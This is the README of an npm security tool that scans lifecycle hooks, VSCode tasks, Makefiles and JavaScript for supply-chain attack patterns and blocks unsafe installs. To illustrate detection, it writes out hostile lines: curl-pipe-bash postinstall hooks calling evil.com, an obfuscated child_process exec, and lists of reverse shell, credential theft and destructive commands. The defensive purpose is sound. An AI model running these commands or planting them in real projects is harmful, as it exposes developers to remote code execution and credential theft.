# 🛡 repo-safe-scan

**Stop supply-chain attacks before they execute.**

Audit `package.json` scripts, VSCode tasks, Makefiles and shell scripts for malicious patterns — **before you `npm install`.**

![npm version](https://img.shields.io/npm/v/repo-safe-scan?color=%2300b894&style=flat-square)
![Node.js >=18](https://img.shields.io/badge/node-%3E%3D18-brightgreen?style=flat-square)
![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

---

## The Problem

Most security tools scan for **known CVEs**. But attackers don't need a CVE — they just need a `postinstall` script:

```json
{
  "scripts": {
    "postinstall": "curl http://evil.com/steal.sh | bash"
  }
}
```

This runs **silently** on `npm install`. No prompt. No warning. Game over.

`repo-safe-scan` catches it **before** it runs.

---

## 🛡 Safe Install — The Killer Feature

> **Replace `npm install` with `repo-safe-install`.** That's it. You're protected.

```bash
npx repo-safe-install
```

| Step  | What Happens                            | Why                                                |
| :---: | :-------------------------------------- | :------------------------------------------------- |
| **1** | `npm install --ignore-scripts`          | Downloads packages **without** executing any hooks |
| **2** | `repo-safe-scan --include-node-modules` | Scans **every** dependency for malicious patterns  |
| **3** | `npm rebuild`                           | Runs lifecycle scripts — **only if scan passes** ✔ |

**If threats are found → install is blocked. Scripts never execute.**

```
  ╔══════════════════════════════════════════════╗
  ║  ✖  INSTALL BLOCKED — threats detected       ║
  ╚══════════════════════════════════════════════╝

  ✖  🆕 NEW DEP  LIFECYCLE  curl-pipe-shell
    node_modules/evil-pkg/package.json → postinstall
    curl http://evil.example.com/payload.sh | bash

  Your dependencies are installed but their scripts have NOT been executed.
```

This upgrades `repo-safe-scan` from a **detection tool** to a **prevention system**.

---

## Quick Start

```bash
# Option 1: Safe install (prevention)
npx repo-safe-install

# Option 2: Scan only (detection)
npx repo-safe-scan ./path/to/repo

# Install globally for repeated use
npm install -g repo-safe-scan
```

---

## What It Scans

| Target                               | Hooks / Patterns                                             |
| :----------------------------------- | :----------------------------------------------------------- |
| **`package.json` scripts**           | `preinstall`, `postinstall`, `prepare` + all script commands |
| **`node_modules/**/package.json`\*\* | Recursive dependency lifecycle hook scanning                 |
| **`.vscode/tasks.json`**             | Auto-run tasks, shell execution in workspace                 |
| **`.vscode/settings.json`**          | Terminal hijacking, shell overrides                          |
| **`Makefile`**                       | Default targets with dangerous commands                      |
| **`*.sh` / `*.bash`**                | Shell scripts referenced by any of the above                 |
| **`*.js` / `*.ts` files**            | AST-level analysis for obfuscated `child_process`, `eval()`  |

---

## What It Catches

| Category                    | Examples                                                |
| :-------------------------- | :------------------------------------------------------ |
| 🌐 **Remote Execution**     | `curl \| bash`, `wget \| sh`, `Invoke-Expression`       |
| 🔀 **Obfuscation**          | `eval()`, `new Function()`, `base64 -d`, `fromCharCode` |
| 🐚 **Reverse Shells**       | `nc -e /bin/sh`, `/dev/tcp/`, `socat`                   |
| 🔑 **Credential Theft**     | `~/.ssh`, `~/.aws/credentials`, `.npmrc`, `.env`        |
| 💣 **Destructive**          | `rm -rf /`, `del /f /q`, `format C:`                    |
| ⬆️ **Privilege Escalation** | `sudo` in npm scripts, `chmod +x` after download        |
| 🔓 **TLS Bypass**           | `curl -k`, `wget --no-check-certificate`                |
| 🕵️ **Reconnaissance**       | `whoami \| curl`, `ifconfig \| nc`                      |

---

## 🆕 Newly Added Dependency Detection

When using `--include-node-modules`, the scanner **automatically detects newly added packages** via `git diff` on `package-lock.json` and flags them with a **🆕 NEW DEP** badge.

New dependencies with lifecycle hooks get **extra scrutiny** — even if no malicious pattern is found, they're flagged because a brand-new package running `postinstall` is inherently suspicious.

```
  HIGH  🆕 NEW DEP  LIFECYCLE  newly-added-lifecycle
  Description: Newly added dependency contains a lifecycle hook
  Detail:      Package "suspicious-pkg" was recently added and has a "postinstall" script.
```

---

## Risk Scoring

Every scan produces a **Repository Risk Score** from 0–10:

```
  ╔═════════════════════════════════════════╗
  ║  Repository Risk Score:  7.5 / 10      ║
  ║  ███████████████░░░░░  HIGH            ║
  ╚═════════════════════════════════════════╝
```

| Factor                               |    Points |
| :----------------------------------- | --------: |
| Critical finding                     |  `25 pts` |
| High finding                         |  `10 pts` |
| Medium finding                       |   `4 pts` |
| Lifecycle hook bonus (critical/high) | `+10 pts` |
| Newly added dependency bonus         |  `+5 pts` |

---

## CLI Reference

### `repo-safe-scan`

```bash
repo-safe-scan [path] [options]
```

| Flag                     | Description                                        | Default  |
| :----------------------- | :------------------------------------------------- | :------- |
| `[path]`                 | Repository root to scan                            | `.`      |
| `--severity <level>`     | Minimum severity: `medium` \| `high` \| `critical` | `medium` |
| `--include-node-modules` | Scan `node_modules` for malicious lifecycle hooks  | off      |
| `--json`                 | JSON output for CI pipelines                       | off      |
| `--no-color`             | Disable colors                                     | off      |

### `repo-safe-install`

```bash
repo-safe-install
```

No flags needed. Runs in the current directory. Replaces `npm install` with the safe 3-step process.

---

## CI Integration

```yaml
# GitHub Actions
- name: Safe dependency install
  run: npx repo-safe-install

# Or scan-only with JSON output
- name: Security scan
  run: npx repo-safe-scan . --json --include-node-modules > scan-results.json
```

---

## Under the Hood

### JavaScript AST Analyzer

Powered by `acorn`. Detects obfuscated attacks like:

```js
const cp = require("child_" + "process");
const { exec } = cp;
exec("curl evil.com | sh");
```

### Command Normalization

Strips quotes, lowercases, collapses whitespace — defeats trivial bypasses like `cUrL   eViL.cOm | bAsH`.

## Real-World Attacks This Would Catch

These are based on **actual npm supply-chain incidents**:

| Attack                        | What Happened                                                                       | How `repo-safe-scan` Catches It                     |
| :---------------------------- | :---------------------------------------------------------------------------------- | :-------------------------------------------------- |
| **`event-stream` (2018)**     | Attacker injected `flatmap-stream` with obfuscated `eval()` stealing crypto wallets | AST analyzer detects `eval()` + dynamic `require()` |
| **`ua-parser-js` (2021)**     | Maintainer account hijacked, `preinstall` script dropped crypto miners              | Lifecycle hook flagged as `CRITICAL`                |
| **`colors` / `faker` (2022)** | Maintainer pushed `postinstall` infinite loop as protest                            | Lifecycle hook detection + command analysis         |
| **`node-ipc` (2022)**         | `postinstall` wiped files on Russian/Belarusian IPs                                 | `rm -rf` pattern + lifecycle hook = `CRITICAL`      |

---

## `npm install` vs `repo-safe-install`

|                                | `npm install`  | `repo-safe-install` |
| :----------------------------- | :------------: | :-----------------: |
| Downloads packages             |       ✅       |         ✅          |
| Runs `postinstall` scripts     | ⚠️ Immediately | 🛡 Only after scan  |
| Detects `curl \| bash` in deps |       ❌       |         ✅          |
| Detects obfuscated `eval()`    |       ❌       |         ✅          |
| Flags newly added deps         |       ❌       |         ✅          |
| Blocks malicious installs      |       ❌       |         ✅          |
| Risk score report              |       ❌       |         ✅          |

---

## FAQ

<details>
<summary><strong>Does this replace <code>npm audit</code>?</strong></summary>

No. `npm audit` checks for **known CVEs** in dependency versions. `repo-safe-scan` checks for **malicious code patterns** in scripts and hooks. They complement each other — use both.

</details>

<details>
<summary><strong>Will this slow down my installs?</strong></summary>

The scan typically takes **1–3 seconds** for most projects. The `--ignore-scripts` install is actually faster than a normal install since no scripts run. The `npm rebuild` step adds the normal script execution time back.

</details>

<details>
<summary><strong>Can attackers bypass this?</strong></summary>

The tool catches common patterns including obfuscated ones (via AST analysis). Highly sophisticated attacks using novel obfuscation could potentially bypass it — no scanner is perfect. But it raises the bar significantly from "zero protection" to catching the vast majority of real-world supply chain attacks.

</details>

<details>
<summary><strong>Does it work in CI/CD?</strong></summary>

Yes. Use `--json` for machine-readable output. Exit code `1` means threats found, `0` means clean.

```yaml
- run: npx repo-safe-install # blocks pipeline if threats found
```

</details>

---

## Contributing

```bash
git clone https://github.com/Chetan2708/repo-safe-scan.git
cd repo-safe-scan && npm install && npm run build
npm test
```

PR's welcome — especially new detection rules in `src/rules/`.

---

## License

MIT © 2026

---

**Stop trusting `npm install`. Start using `repo-safe-install`.**

[![npm](https://img.shields.io/npm/v/repo-safe-scan?color=%2300b894&style=for-the-badge)](https://www.npmjs.com/package/repo-safe-scan)
